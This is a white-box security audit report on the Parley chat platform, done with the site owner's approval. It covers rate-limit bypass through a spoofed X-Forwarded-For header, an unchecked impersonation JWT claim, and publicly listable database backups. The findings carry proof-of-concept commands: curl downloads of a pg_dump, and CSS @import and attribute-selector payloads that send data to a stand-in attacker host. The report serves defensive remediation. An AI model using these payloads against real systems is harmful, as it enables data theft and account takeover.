# Parley adversarial security audit — 2026-04-23

**Scope agreed with the site owner.** White-box, live prod. External attacker model permitted to:
- hit origin IPs directly (bypass Cloudflare)
- operate from a compromised DMZ position (dmz-proxy, CT 106 on `eqr`)
- use knowledge of internal topology
- create throwaway accounts, send payloads, exhaust rate limits

Not in scope: OS/SSH/hypervisor-level attacks on prod containers, attacks on the co-tenant `gitwise` app.

**Attack host used.** dmz-proxy (CT 106, 10.0.0.230 + 10.10.10.5) — the production reverse proxy — simulating a root-compromised DMZ.

**Team.** Phase 1 + 2 by lead. Phases 2+/3/4 parallelized to a team of 5: `cf-scout`, `dmz-injector` (×2, dispatched independently, arrived at overlapping conclusions), `auth-auditor`/`auth-surface`, `xss-ai`, `data-surface`.

---

## Topology (as observed)

```
                       Cloudflare (WAF + DDoS + TLS)
                              │
                    ┌─────────┴─────────┐
                    ▼                   ▼
              dmz-proxy (106)       wg-vpn (107)
              10.0.0.230            10.0.0.240
              (eth0=vmbr0)
                    │ eth1 = 10.10.10.5
                    ▼
─────────── vmbr1 (10.10.10.0/24, "internal") ──────────
 parley-admin  parley-db   parley-api-1  parley-minio   observability   gitwise-*
   .15         .10          .11           .21           .60              .30 / .31
```

**DMZ layer.**
- Single nginx virtual host per tenant (`parley.byexec.com`, `gitwise.byexec.com`) + default-server `ssl_reject_handshake`.
- `if ($is_cloudflare = 0) { return 403; }` keyed on `$realip_remote_addr` (the TCP peer, not spoofable). Correct.
- 21 purpose-built `fail2ban` jails on `/var/log/nginx/dmz-access.log`. Ban action is `deny <ip>;` in a nginx-included conf + reload — bans evaluate against the realip-rewritten `$remote_addr`. Correct.
- `proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;` — **appends** to whatever XFF arrived (see F6).
- `X-Real-IP` overwritten to `$remote_addr`. Good.
- **Nothing else is stripped** — arbitrary `X-*` headers from the client pass byte-for-byte to origin (see F-headers-smuggle).

**Backend layer.**
- PVE firewall: default `-P FORWARD ACCEPT` with one explicit `-s 10.10.10.0/24 -d 10.0.0.0/24 -j DROP` (blocks internal→DMZ-LAN egress). No per-container `.fw` file.
- Per-container nginx on each backend (api, admin) serves the SPA + proxies `/api` to Go on localhost:8080. **No source-IP allow-list** (see F1).
- pgbouncer on 0.0.0.0:6432 with plaintext-password in `/etc/pgbouncer/userlist.txt` (D5).

---

## Findings at a glance

| ID | Sev | Title |
|----|-----|-------|
| **F6** | **CRIT** | `auth.ClientIP()` trusts leftmost `X-Forwarded-For` — rate-limit & audit-log bypass, **fully remote via Cloudflare** |
| **F-impersonation-claim** | **CRIT** | `impersonation: true` JWT claim is minted but never validated — any admin → any user for 1 h, no audit trail |
| **D1** | **CRIT** | MinIO bucket anon-listable — Postgres backups (pg_dump custom) publicly downloadable to anyone on vmbr1 |
| F1 | HIGH | Backends have zero network-layer ingress gating on vmbr1 |
| F2 | HIGH | `gitwise` shares vmbr1 with `parley` — cross-tenant blast radius |
| F-admin-jwt-secret | HIGH | Admin service holds `PARLEY_JWT_SECRET` directly; admin compromise = forever-mint every user JWT |
| F-theme-validator | HIGH | Theme CSS validator regex only inspects `url(…)`; `@import "…"` / protocol-relative / hex-escaped all bypass; no CSP to fall back on |
| D2 | HIGH | Kick/Ban/Leave doesn't invalidate `MembershipCache` or drop WS subscriptions — banned users keep seeing messages |
| D3 | HIGH | Bot API keys have no scope system — leaked token = full user session for the bot |
| F7 | MED | Admin rate-limit keys on `r.RemoteAddr` → all CF-routed admins share one bucket (global DoS of admin login) |
| F-headers-smuggle | MED | DMZ forwards any `X-*` header unchanged; any future internal-trust header is remote-spoofable by default |
| F-auth-3 | MED | Passkey RP origin list unconditionally includes `http://localhost:5173` and `:8080` in prod |
| F-auth-4 | MED | `/api/auth/register` returns different error strings for "email exists" vs "invalid invite" — enumeration under F6 bypass |
| D4 | MED | `maxBotsPerUser=10` fan-outs user-keyed msg-write rate limit by 11× |
| D5 | MED | pgbouncer + postgres reachable from any vmbr1 host; plaintext password in `/etc/pgbouncer/userlist.txt` (F1 amplifier) |
| F-impersonate-no-audit | MED | Admin `handleImpersonate` has no audit log (unlike sibling ban/unban paths) |
| F-impersonate-any-target | MED | No target-class check — any admin can impersonate other admins, bots, system users |
| F-comment-code-drift | MED | `cmd/api/middleware.go:176-178` comment claims "uses r.RemoteAddr exclusively" — code does the opposite |
| F-no-csp | MED (hardening) | No `Content-Security-Policy` anywhere (repo-wide grep) |
| F-admin-impersonate-optional | LOW | `ADMIN_IMPERSONATE_SECRET` is optional-with-warning in `cmd/admin/main.go:63` — fails open on misconfig |
| F-impersonate-replay | LOW | 1 h replay window with no admin-session binding, no single-use / nonce |
| F-ws-ban-check | LOW | WS JWT fallback skips `BannedAt` check (REST middleware does; inconsistent) |
| F-auth-removepw-race | LOW | `handleRemovePassword` has a TOCTOU with concurrent passkey-delete → user can lock themselves out |
| F-ai-worker-skip-validate | LOW | AI-theme worker doesn't call `validateCSS`; relies on Save re-validate |
| F-ws-ticket-query-leak | LOW | WS ticket lands in query-string → nginx access-log leak (mitigated by single-use + 60 s TTL) |
| F-admin-assets-listing | LOW | `r.Handle("/assets/*", http.FileServer(...))` → auto-index listing leaks bundle hashes |
| F-admin-origin-fallback | LOW | `adminOrigin()` defaults to hardcoded stale DO IP over HTTP |
| F-gitignore-gap | LOW | `.gitignore` misses timestamped tfstate rotations (`*.tfstate.<ts>.backup`) |
| F-cert-shared-sans | INFO | Origin cert covers both `parley.byexec.com` and `gitwise.byexec.com` — key theft impersonates both |
| F-plaintext-dmz-to-origin | INFO | DMZ → backends over HTTP; fine on trusted LAN |
| F-obs-broken-redirect | INFO | `grafana` 301s to `localhost:8081/grafana/` — broken reverse-proxy config |

---

## CRITICAL

### F6 — `auth.ClientIP()` trusts client-supplied `X-Forwarded-For` — fully remote via Cloudflare

**Location.** `internal/auth/middleware.go:65-81`. Consumers: `cmd/api/middleware.go:179-193` `rateLimitMiddleware`, audit-log `log.Printf("audit: rate_limited ip=%s ...", ip)`, audit-dedup `auth.ShouldLogAuditOnce("ratelimit:ip:" + ip)`. Affected rate limiters: `authLimiter` (10/min), `inviteLimiter` (30/min), `msgReadLimiter` (120/min), `discoverLimiter` (30/min).

**Code.**
```go
func ClientIP(r *http.Request) string {
    if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
        if idx := strings.Index(xff, ","); idx > 0 {
            return strings.TrimSpace(xff[:idx])  // leftmost wins → attacker-controlled
        }
        return strings.TrimSpace(xff)
    }
    if xri := r.Header.Get("X-Real-IP"); xri != "" {
        return strings.TrimSpace(xri)
    }
    ...
}
```

**Comment-vs-code drift.** `cmd/api/middleware.go:176-178` states: "uses r.RemoteAddr exclusively to avoid trusting client-supplied headers." The implementation does the opposite. Fix the code to match the comment.

**Three PoCs, stacking.**

**PoC-1 — direct-to-origin from DMZ** (baseline, lead's initial test):
- 15 × `POST http://10.10.10.11/api/auth/login` with **constant** `X-Forwarded-For: 198.51.100.7` → 10 × 401, then 5 × 429 (limit works when keyed on one IP).
- 15 × same with **rotating** `X-Forwarded-For: 203.0.113.{1..15}` → **15 × 401, 0 × 429** (every spoofed IP gets its own bucket).
- Control: 15 × no XFF → 10 × 401, then 5 × 429 (fallback bucket unpolluted).

**PoC-2 — compromised DMZ via rogue listener on :8443** (`dmz-injector` agent):
- 12 × constant XFF → 10 × 401, 2 × 429.
- 12 × rotating XFF → **12 × 401, 0 × 429**. Same result, different attack position.

**PoC-3 — remote via Cloudflare** (`cf-scout` agent):
- Temporary header-echo `location /cf-probe-…` on dmz-proxy.
- Client (`98.34.90.69`) sent `X-Forwarded-For: 198.51.100.99` via CF → nginx received `xff=[198.51.100.99,98.34.90.69]`. CF **preserves** client-supplied XFF as leftmost; only appends the real client IP afterward. `auth.ClientIP()` takes the leftmost — **fully remote, pre-auth, unauthenticated bypass.**

**Impact.**
- Remote password spray, invite-code brute, password-reset flood, email enumeration (see F-auth-4), bot-invite-token brute, theme-token brute — anything the Go IP-keyed limiters gate becomes 100× or more cheaper.
- Audit log poisoning: `log.Printf("audit: rate_limited ip=%s ...", ip)` records the spoofed IP.
- Audit dedup poisoning: attacker primes future IPs, suppressing legitimate rate-limit audit entries.
- fail2ban on DMZ still catches CF-routed bursts of 5× same-endpoint 401 from a single real client IP (it keys on `$remote_addr` post-realip = CF-Connecting-IP, not on XFF) — so the defense-in-depth helps, but a careful attacker throttling per-CF-IP below fail2ban's `maxretry` stays invisible.

**Fix.** At the DMZ nginx:
```
proxy_set_header X-Forwarded-For $http_cf_connecting_ip;   # replace, not append
```
And/or in `auth.ClientIP()`, source from `X-Real-IP` only (which DMZ overwrites to `$remote_addr`) — never read `X-Forwarded-For` until the DMZ normalizes it. Either one closes the remote vector; doing both is safer.

Also strip for good measure (defense-in-depth — F-headers-smuggle):
```
proxy_set_header X-Real-IP $remote_addr;
proxy_set_header True-Client-IP "";
proxy_set_header Forwarded "";
```

---

### F-impersonation-claim — `impersonation: true` claim is minted but never validated — admin can mint indistinguishable user JWTs

**Locations.**
- `cmd/api/auth_handlers.go:229-255` `handleImpersonateToken` (api-side minter)
- `internal/auth/service.go:797-810` `GenerateImpersonationToken` (sets `"impersonation": true`)
- `internal/auth/service.go:669-709` `ValidateToken` (consumer — **does not inspect the claim**)
- `internal/auth/middleware.go:143` `AuthMiddlewareWith` (consumes validated token → surfaces `UserIDKey`; does not forward the impersonation flag)
- `cmd/admin/handlers.go:162-181` `handleImpersonate` (admin-side parallel minter, signs directly with `PARLEY_JWT_SECRET`)

**Proof.** Repo-wide grep for `"impersonation"`: the only hits are at the set-sites above plus unit-test assertions. **No consumer, anywhere.** The token is a fully-privileged user session for the target user, TTL 1 h, signed with the same secret as ordinary user JWTs.

**Additional gaps around the same flow:**
- **F-impersonate-no-audit.** Unlike sibling admin paths (`handleBanUser`, `handleUnbanUser`, `handleForceLogout` at `cmd/admin/handlers.go:130,144`), `handleImpersonate` emits no audit log.
- **F-impersonate-any-target.** No target-class check — an admin can impersonate another admin, a bot user, or a system user. No ban check on target before minting.
- **F-impersonate-replay.** Once issued, the token is freely replayable for 1 h by anyone holding it; no admin-session binding, no single-use `jti`, no nonce.
- **F-admin-impersonate-optional.** `cmd/admin/main.go:63` — if `ADMIN_IMPERSONATE_SECRET` is unset, only a warning is logged, the service starts anyway. Fail-open.

**Exploitability per attacker position.**

| Position | What's needed | Result |
|---|---|---|
| Unauthenticated remote via CF | User JWT + `ADMIN_IMPERSONATE_SECRET` | With leaked secret → any-user takeover (DMZ forwards `X-Admin-Impersonate` + `X-Admin-Secret` unchanged — F-headers-smuggle) |
| Authenticated regular user | `ADMIN_IMPERSONATE_SECRET` | Same |
| Compromised DMZ | Intercept a legit admin call via malicious nginx (TLS terminates here) | Steal secret + blobs; replay freely |
| Compromised admin container | Read env | Mints via `PARLEY_JWT_SECRET` (F-admin-jwt-secret) — no secondary secret needed |
| Compromised api container | Read env | Either path |

**Noteworthy.** `POST /api/auth/impersonate-token` in parley-api **has no legitimate caller** — admin-side mints directly via `handleImpersonate`. The api endpoint exists solely as an attack surface; removing it eliminates the cross-container secret-sharing requirement entirely.

**Fix.**
1. **Enforce the claim** — at `ValidateToken`, surface `impersonation: true` through the context. At every mutating endpoint either deny impersonation tokens or log with actor/target.
2. **Embed actor admin ID + `jti` + purpose** in the impersonation token claims; middleware enforces jti single-use and surfaces actor for audit.
3. **Tight TTL** (5-10 min) — 1 h is way too long for an action people finish in seconds.
4. **Reject impersonation of admins / bots / system users** in `handleImpersonate`.
5. **Audit log** on issue and on every use (with the actor claim once available).
6. **Delete `POST /api/auth/impersonate-token`** from parley-api. It has no caller in admin. Kill the cross-container secret.
7. **Separate signing keys per purpose** — user-JWT vs impersonation vs desktop vs ws-ticket. Don't reuse `JWT_SECRET` for everything.

---

### D1 — MinIO bucket anon-listable; Postgres backups publicly readable

**Location.** MinIO at `10.10.10.21:9000`, bucket `parley`. Uploads use `internal/spaces/client.go:67` with `ACL: "public-read"`. Bucket policy permits anonymous list+get on the whole bucket. `cmd/api/main.go:350` configures only CORS (GET from siteURL); no bucket-policy hardening, no prefix-based restriction.

Backups mechanism: `terraform/userdata-db.sh:220-223` writes pg_dump files locally; the runtime mirrors them into MinIO under `backups/`.

**Proof (from dmz-proxy, zero auth):**
```
curl -s 'http://10.10.10.21:9000/parley/?list-type=2&max-keys=5'
# <ListBucketResult>... <Key>backups/parley-20260418-015846.dump</Key> ...

curl -s -o /tmp/dump 'http://10.10.10.21:9000/parley/backups/parley-20260418-015846.dump'
file /tmp/dump
# /tmp/dump: PostgreSQL custom database dump - v1.15-0
```

**Reachability.** Only from vmbr1 at present (F1, F2). But:
- A gitwise compromise (F2) reaches it immediately.
- Any compromised-DMZ position reaches it.
- A compromised API node reaches it.
- Any future feature that proxies to MinIO for user content could inadvertently expose it to the internet.

**Impact.** Total data compromise on any LAN foothold: argon2 password hashes, bot API-key SHA-256 hashes (not reversible to plaintext, but usable if the plaintext is ever re-found elsewhere — note `internal/auth/middleware.go:121` authenticates bots on SHA-256 match only, no per-request HMAC), email addresses, phone numbers, all DM and channel message content, invite codes, bot-AI provider keys encrypted with `BOT_KEY_SECRET` (decryptable if secret leaks — and the secret is replicated to every api container).

**Fix (immediate).**
1. `mc anonymous set none parley`.
2. Explicit bucket policy: deny `s3:ListBucket` for `*`; grant `s3:GetObject` only on `avatars/*`, `uploads/*`, `soundboard/*`, `audio/*`.
3. Move `backups/*` to a separate private bucket with IAM-auth-only, or stop syncing them to MinIO entirely.
4. MinIO should only accept traffic from dmz-proxy's eth1 and parley-api (F1 generic fix).
5. Rotate everything in the latest dump: all user password hashes invalidated (force pw reset), all bot API keys invalidated, `BOT_KEY_SECRET` rotated (re-encrypts stored provider keys).

---

## HIGH

### F1 — Backends lack network-layer ingress gating

**Evidence.** From dmz-proxy (10.10.10.5):
```
GET  http://10.10.10.11/health              → 200 {"status":"ok"}
GET  http://10.10.10.11/api/discover        → 200 (527-byte JSON)
GET  http://10.10.10.11/api/themes/repo     → 200 (27 KB JSON)
POST http://10.10.10.11/api/auth/login      → 401 (works; no CF needed)
GET  http://10.10.10.15:8080/               → 200 (admin SPA)
GET  http://10.10.10.15:8080/api/users      → 401 (app-auth only; no network gate)
GET  http://10.10.10.21:9000/parley/?list…  → 200 (D1)
```

**Fix.** Per-backend nginx `allow 10.10.10.5; deny all;` in each upstream service block — and/or PVE container firewall rules in `/etc/pve/firewall/10{0,1,2,3}.fw`. Network gating is strictly stronger than the CF-only edge gate.

### F2 — Zero tenant isolation on vmbr1

**Evidence.** `gitwise-db` (`10.10.10.30`) and `gitwise-app` (`10.10.10.31`) share `vmbr1` with parley's entire backend. Combined with F1, a gitwise RCE or a parley RCE reaches the other tenant at L3 directly.

**Fix.** Per-tenant bridge (`vmbr-parley`, `vmbr-gitwise`) with dmz-proxy routing between them, or strict per-container firewall denying cross-tenant IPs.

### F-admin-jwt-secret — Admin service holds `PARLEY_JWT_SECRET` and mints user JWTs directly

**Location.** `cmd/admin/main.go:57`. `cmd/admin/handlers.go:162-181` signs impersonation JWTs locally using `parleyJWTSecret` — bypassing the api-side `X-Admin-Secret` handshake entirely.

**Impact.** Compromise of the admin container (10.10.10.15) = full api JWT-signing authority. The attacker mints valid user JWTs for any `user_id`, for any duration, forever — until `JWT_SECRET` is rotated everywhere simultaneously. There is no `kid`, no `jti`, no deny-list (only `force_logout_at` per user, which doesn't help against `iat`-future-forgery).

**Fix.** Remove `PARLEY_JWT_SECRET` from the admin container entirely. Admin calls api's `POST /api/auth/impersonate-token` (with improvements from F-impersonation-claim fix) using a signed short-lived admin credential or mTLS. Mint authority stays in one place.

### F-theme-validator — Theme CSS validator regex bypass

**Location.** `internal/theme/service.go:18,41-68`. DOM sink at `frontend/src/context/ThemeContext.tsx:38-48` (applies theme CSS to `document.head`). No CSP anywhere (F-no-csp).

**Bypassing inputs** (validator returns `ok=true`):
- `@import "https://evil.tld/x.css";` (string form @import, no `url()` token)
- `@import "//evil.tld/x.css";` (protocol-relative)
- `@import '\68\74\74\70s://evil.tld/x.css';` (hex-escaped "https")
- `background: url(data:image/svg+xml;base64,...)` (allowed data: URIs)

**Impact.** Publish theme → admin features it → every installer beacons attacker on every page load. CSS attribute-selectors can exfiltrate input-field content, checkbox state, fragment text. Not script-XSS, but mass cross-account data exfil.

**Fix.** Replace the regex with a real CSS parser (`github.com/tdewolff/parse/v2/css`) and walk declarations; reject any `@import` whose host isn't on the allow-list regardless of form. Short-term belt-and-suspenders: add a second regex for bare `@import\s+['"]…['"]`. Separately deploy a CSP: `default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; ...`.

### D2 — Kick / Ban / Leave doesn't invalidate membership cache or drop WS subscriptions

**Location.** `internal/server/server_members.go:58-91` (RemoveMember), `:93-141` (KickMember), `:143-192` (BanMember). WS access check at `cmd/api/main.go:173-247` (`SetChannelAccessChecker`) uses a 30-second `MembershipCache`. `InvalidateMember` is never called in prod (only in `membership_test.go:73`).

**Impact.**
- Existing subscriptions are never re-authorized — a kicked user keeps receiving `MESSAGE_CREATE`, voice-state, typing, pin, member events for every previously-subscribed channel until they voluntarily disconnect or their JWT expires (up to 24 h).
- Within 30 s of a kick, the victim can still issue `CHANNEL_SUBSCRIBE` and the cache will say "still a member."

**Fix.** In each remove/kick/ban path: `s.memberCache.InvalidateMember(sID, uID)` + `s.memberCache.InvalidatePermsForUser(sID, uID)`, plus `hub.UnsubscribeUserFromServer(userID, serverID)` that walks the user's WS clients and drops subscriptions whose channels belong to that server. `DisconnectUser` is too blunt (kills DMs too). Same pattern needed for any permission change that removes `ViewChannel`.

### D3 — Bot API keys have no scope system

**Location.** `internal/auth/middleware.go:115-141`, `cmd/api/developer_handlers.go:39-137`. `IsAPIKeyAuth` is referenced at exactly one place (`internal/message/service.go:187`) and only to set a `via_api` flag on stored messages — no restriction enforced.

**Impact.** A leaked `plk_…` token grants full user-session authority for the bot user across every server it's in. The per-user rate limit (5 msg/s) is the only throttle.

**Fix.** Add `api_keys.scopes TEXT[]`; define scopes (`messages:read`, `messages:write`, `commands:write`, `profile:write`, `servers:list`, ...); middleware enforces; existing keys grandfather to a `full` scope and get flagged for rotation.

---

## MEDIUM

### F7 — Admin rate-limit shares a single bucket across all CF-routed traffic

**Location.** `cmd/admin/server.go:86-99`. Splits `r.RemoteAddr` directly. All CF-routed traffic arrives with `r.RemoteAddr = 10.10.10.5` (DMZ eth1), so the 5-attempts-per-minute login limit is a **single global bucket** for every real admin. One attacker trips it for everyone.

**Fix.** Same as F6 — source real client IP from a trusted DMZ-only header.

### F-headers-smuggle — DMZ forwards arbitrary `X-*` headers unchanged

**Location.** `/etc/nginx/sites-enabled/dmz.conf`. Only sets `Host`, `X-Real-IP`, `X-Forwarded-For`, `X-Forwarded-Proto`. Explicitly strips: nothing.

**cf-scout proof:** `X-Admin-Impersonate`, `X-Internal-Auth`, `X-Impersonate-User`, `Forwarded`, `Via`, `True-Client-IP`, `CF-Connecting-IPv6` all arrive at origin byte-for-byte from a public CF visitor.

**Impact today.** Latent — the Go backend only reads `X-Admin-Impersonate`, `X-Admin-Secret`, `X-Forwarded-For`, `X-Real-IP`, `X-Bench-Secret` (grepped via `dmz-injector` — no speculative trust headers honored). The F-impersonation-claim chain uses `X-Admin-Impersonate` + `X-Admin-Secret` — both smuggle through.

**Future risk.** Any developer adding a trusted `X-Internal-*` / `X-Admin-*` / `X-Parley-*` header assumes the DMZ prevents external injection. It does not.

**Fix.**
```
# in each server block, after the CF check:
proxy_set_header X-Admin-Impersonate  "";
proxy_set_header X-Admin-Secret       "";
proxy_set_header X-Bench-Secret       "";
proxy_set_header True-Client-IP       "";
proxy_set_header Forwarded            "";
# or better: switch to whitelist via headers-more module:
more_clear_input_headers 'X-Admin-*' 'X-Internal-*' 'X-Parley-*' 'X-Bench-*' 'True-Client-IP' 'Forwarded';
```

### F-auth-3 — Passkey origins include `http://localhost:*` in prod

**Location.** `internal/passkey/service.go:80-84`. `originsFromURL` always appends `http://localhost:5173` and `http://localhost:8080` regardless of env; `cmd/api/main.go:266` calls it unconditionally.

**Exploitability.** Not direct: browsers won't release a credential for `RPID=parley.byexec.com` from a `localhost` origin (host mismatch). But any future bug that lets an attacker spoof `Origin` to a value the server would accept becomes instantly exploitable. Defense-in-depth violation.

**Fix.** `if env != "dev"` guard around the localhost origins.

### F-auth-4 — `/api/auth/register` error differential enables email enumeration

**Location.** `internal/auth/service.go:119-149`. Distinct user-visible errors for "username already exists", "email already exists", "invalid/used invite code". `/api/auth/forgot-password` is correctly opaque; register isn't.

**Exploitability under F6.** Rotate `X-Forwarded-For`, pre-burn an invite once, enumerate emails; F6 removes the 10/min gate.

**Fix.** Return a single generic "registration failed" for all pre-transaction failures. Or consume/invalidate the invite attempt even on pre-failure to bound enumeration attempts to the number of invites the attacker holds.

### D4 — Per-owner bot fan-out multiplies user-keyed rate limit

**Location.** `cmd/api/developer_handlers.go:91-100` (`maxBotsPerUser = 10`). `msgWriteLimiter` is user-keyed at 5 writes/s. One owner with 10 bots + their own user = 11 × 5 = **55 sustained writes/s** from one attacker via one TCP peer. Compose with F6 for signup fan-out.

**Fix.** Aggregate cap across userID + owned bots (e.g., 10 msg/s total), or lower `maxBotsPerUser` to 3 with per-server cap (25 bots/server).

### D5 — pgbouncer + postgres reachable from vmbr1

**Location.** `terraform/userdata-db.sh:176` `listen_addr = 0.0.0.0`, ufw section skipped for LXC (line 135), `/etc/pgbouncer/userlist.txt` written plaintext at line 208.

**Proof (from dmz):** `nc -zv 10.10.10.10 6432` → open; `nc -zv 10.10.10.10 5432` → open. Auth is scram-sha-256 (no MITM shortcut) but the service is reachable. Combined with D1 exposing the backup that contains the pgbouncer password in its provisioning context = full DB read/write.

**Fix.** Bind pgbouncer to `10.10.10.10` only; per-container firewall permits only API and admin container IPs. Don't write userlist.txt plaintext — use `auth_query`.

### F-impersonate-no-audit / F-impersonate-any-target / F-comment-code-drift / F-no-csp

See Findings-at-a-glance table + F-impersonation-claim discussion above for the first two. The last two are self-explanatory source cleanups.

---

## LOW

### F-admin-impersonate-optional
`cmd/admin/main.go:63` — `ADMIN_IMPERSONATE_SECRET` is optional with a warning. Make it fatal on unset.

### F-impersonate-replay
1 h TTL + no binding = captured token is a fully-privileged user session for an hour. Covered by F-impersonation-claim fix.

### F-ws-ban-check
`cmd/api/websocket_handler.go:49-58` only checks `IsForceLoggedOut`, not `BannedAt`. REST middleware at `internal/auth/middleware.go:154-161` checks both. In practice `handleBanUser` calls `ForceLogoutUser` so WS drops — but the dependency is fragile. Fix: WS should check ban directly.

### F-auth-removepw-race
`cmd/api/passkey_handlers.go:14-38` — TOCTOU between passkey list check and password removal. Self-lockout, not privesc. Wrap in a single `UPDATE users SET password_hash='!' WHERE id=$1 AND EXISTS (SELECT 1 FROM passkeys WHERE user_id=$1)`.

### F-ai-worker-skip-validate
`internal/ai/worker.go:182-197` only checks brace balance; `Save` re-validates. Add `service.validateCSS` call at generation for defense-in-depth.

### F-ws-ticket-query-leak
Ticket is in the query string of the WS upgrade — captured by nginx access log at DMZ. Mitigated by 60s TTL + single-use GetDel. Consider moving to a cookie or header.

### F-admin-assets-listing
`r.Handle("/assets/*", http.FileServer(http.Dir("/var/www/parley-admin")))` enables directory indexes. Wrap the FileServer to 404 on directory paths.

### F-admin-origin-fallback
`cmd/admin/server.go:17-22` defaults `ADMIN_ORIGIN` to `http://167.71.242.21` (stale DO IP, HTTP). Fail closed if env is unset.

### F-gitignore-gap
`.gitignore` matches `terraform.tfstate.backup` literally, not `terraform.tfstate.<ts>.backup`. Two such files are committed (stale IPs, but the pattern will recatch on every terraform run). Fix: `terraform/**/terraform.tfstate*`.

---

## INFO / positive findings

- **fail2ban on DMZ is genuinely effective** — 21 purpose-built jails on `dmz-access.log`, each keyed on rewritten `$remote_addr` (= CF-Connecting-IP). Ban action writes `deny <ip>;` to an http-included conf and reloads — evaluates against the rewritten client IP, not the CF edge peer. `dmz-parley-authz-403` is actively catching real attack traffic (3 banned, 88 failed observed during the audit).
- **Interaction tokens** (`internal/botcommands/service.go:625-632`): 32 random bytes hex, 128-bit entropy, single-use state machine, 15-minute TTL, stored-channel binding prevents pivot. Strong.
- **Desktop auth codes** (`internal/desktopauth/service.go`): 32 random bytes base64url, 2-min TTL, Redis `GetDel` atomic single-use, state-bound. Strong.
- **WS tickets** (`cmd/api/ws_ticket.go`): 32 random bytes hex, 60 s TTL, single-use Redis `GetDel`. Strong.
- **Registration invites**: ~58 bits of entropy, `handleCheckInvite` returns identical `{valid:false}` for used and nonexistent — no enumeration oracle.
- **Password reset**: 256-bit token, 1 h TTL, atomic consume; response is opaque for unknown email.
- **Admin login JWT**: separate secret, separate claim shape — not cross-usable with api JWT. bcrypt-compared.
- **JWT validation correctness**: `internal/auth/service.go:639-644`/`669-681` enforce `token.Method.(*jwt.SigningMethodHMAC)` — rejects `alg:none` and `alg:RS256` confusion.
- **Markdown / KaTeX / code-block pipeline**: react-markdown 10 with `disallowedElements:['html'] + unwrapDisallowed`, rehype-katex default `trust:false`, KaTeX 0.16.38 (past CVE-2024-28243), both React raw-HTML sinks wrap DOMPurify'd Shiki output. **No stored-XSS in markdown found.**
- **Stored-content surfaces** (bios, bin posts, line comments, reactions, usernames, server/channel names): React text children; `SafeLink` handles external anchor hardening.
- **Avatar URL rendering**: React sanitizes `javascript:` in `<img src>`; no exploitable path.
- **Upload flow** (`internal/spaces/client.go`): server-mediated (no presigned-URL API exposed), keys server-derived as `uploads/<crypto-rand-hex>.<ext>`, magic-byte allow-list (`cmd/api/helpers.go:103-133`) rejects HTML/SVG/JS, 50 MB cap, 1 GB rolling quota, 30/hour per-user. No XSS-via-CDN.
- **Giphy handler** (`cmd/api/giphy_handler.go`): upstream host hardcoded; user `q` only reaches query string via `url.Values.Encode()` (properly escaped). No SSRF. `GIPHY_API_KEY` never echoed.
- **Redis pub/sub fan-out** (`internal/websocket/redis.go:16`): single `parley:events` channel, all-events-to-all-nodes, local filter on per-node `channelSubs`. Isolation is enforced at subscribe-time via `CheckChannelAccess` (fails closed on nil). The gap is D2 — membership changes don't propagate.
- **Passkey strict-RPID / origin binding** (apart from F-auth-3 cosmetic): RPID correctly derived from siteURL host; no apex-vs-subdomain confusion.

---

## Attack chains

### Chain A — pure remote, pre-auth (CF-routed)
1. `F6` → rotate `X-Forwarded-For` on `/api/auth/register` → try invite codes without rate limit. 58-bit entropy is still infeasible at CF latency, but the cap is removed.
2. `F-auth-4` → register error differential enumerates valid emails.
3. `F6` → password-spray against enumerated emails on `/api/auth/login`. The fail2ban edge still catches *individual-IP* bursts, but per-CF-client throttling below `maxretry=5` stays invisible.
4. One successful login = one stolen account.

### Chain B — insider / env-leak → mass account takeover (remote detonation)
1. Attacker holds `ADMIN_IMPERSONATE_SECRET` (from any of: prior admin access, stale dev env, committed secret in an old branch, admin container logs, MITM of a legit admin call via compromised DMZ per F-impersonate-replay/F-headers-smuggle, or the cross-container envvar footprint).
2. Register any Parley account.
3. `POST https://parley.byexec.com/api/auth/impersonate-token` with `X-Admin-Impersonate: <target>` + `X-Admin-Secret: <leaked>` (both smuggle through CF+DMZ unchanged — F-headers-smuggle).
4. Receive 1 h user JWT (F-impersonation-claim — indistinguishable from a real session).
5. No audit log (F-impersonate-no-audit), no admin-identity binding (F-impersonate-any-target), freely replayable for the full hour (F-impersonate-replay).

### Chain C — gitwise RCE → total parley data compromise
1. Compromise gitwise-app (10.10.10.31) via any app-level RCE.
2. From gitwise's vmbr1 position (F1+F2): `curl http://10.10.10.21:9000/parley/?list-type=2` → listing includes `backups/*` (D1).
3. Download latest pg_dump (D1).
4. Restore locally, extract: password hashes, bot key hashes, email addresses, DM contents, invite codes, encrypted bot-AI provider keys. If `BOT_KEY_SECRET` also leaks (it's replicated to every api container, D5 shows pgbouncer reachable, MinIO had backups which may include env), provider keys decrypt too.
5. Optionally: connect directly to pgbouncer (D5) using creds from the dump's provisioning context, proxy arbitrary SQL.

### Chain D — CSS-exfil-at-scale via malicious published theme
1. Register Parley account (need an invite; F-auth-4 + F6 help with enumeration, or just be a legit user).
2. Create theme: `body { font-family: 'x'; } @import "https://attacker.tld/leak.css";` — bypasses validator (F-theme-validator).
3. Publish theme. If admin features it → mass distribution. If not → social-engineer users to install.
4. On every victim pageload, `@import` fetches from attacker.tld (no CSP, F-no-csp).
5. Attacker CSS uses `[value^="a"] { background: url(https://attacker.tld/leak?…); }` attribute selectors to exfiltrate input-field content, state, etc. Beacon on every pageload = live view.

---

## Manifest — changes made to prod during the audit

All items tracked for rollback; as of 09:00 UTC the state is:

- **CT 106 `/root/.ssh/authorized_keys`** — appended `aegis-dev@digitalocean` pubkey (one line). **Still in place.** Remove after audit closes.
- **CT 106 `/root/audit/`** — tree of recon/bypass/dmz/app/report/manifest; probe logs + the pre-audit nginx snapshot at `/root/audit/dmz/nginx-snapshot-1776934209/`. **Still in place.** Safe to remove en bloc when done.
- **CT 106 `/etc/nginx/sites-enabled/dmz.conf`** —
  - `cf-scout` added `location = /_audit_hdr_a7b3c9`, reloaded, removed, reloaded. Backup at `/root/audit/dmz/dmz.conf.bak-cfprobe-be3a0afe7f2de8f6`. Diff vs snapshot is empty. **Restored.**
  - `dmz-injector-2` added an `audit-inject.conf` in sites-enabled on port 8443 for the header-injection harness, removed + reloaded + `ss -tlnp` confirmed no :8443 listener, sites-enabled back to `dmz.conf` only. **Restored.**
  - `dmz-injector` (first) made no nginx changes.
- **No packages installed** on dmz. No services started. No writes to MinIO. `/tmp/dump` deleted after D1 verification.
